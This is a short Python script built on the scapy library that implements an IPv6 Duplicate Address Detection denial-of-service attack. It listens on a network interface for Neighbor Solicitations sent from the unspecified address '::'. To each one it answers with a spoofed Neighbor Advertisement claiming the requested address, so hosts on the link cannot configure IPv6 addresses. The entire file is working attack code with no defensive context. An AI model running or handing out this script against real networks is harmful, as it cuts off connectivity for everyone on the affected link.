from __future__ import print_function
from scapy.all import *
import random
import hashlib


class DadReply:
    flag = True
    nonce = ""
    i = 0
    trustND = ''

    def __init__(self, iface):
        self.iface = iface


    def sendNa(self, ip):

        l2 = Ether(dst='33:33:00:00:00:01')
        l3 = IPv6(src=ip, dst='ff02::1')
        na = ICMPv6ND_NA(tgt=ip)


        p = l2 / l3 / na
        print("Sending NA message")
        sendp(p, iface=self.iface)

    def verifingNS(self, packet):
        if IPv6 in packet:
            print(packet[IPv6].src)
            if packet[IPv6].src=="::":
                if ICMPv6ND_NS in packet:
                    ns = packet[ICMPv6ND_NS]
                    ip = ns.tgt
                    print(ip)
                    self.sendNa(ip)

    def sniffingAndReply(self):
        print("Replay DAD is starting")
        sniff(prn=self.verifingNS)
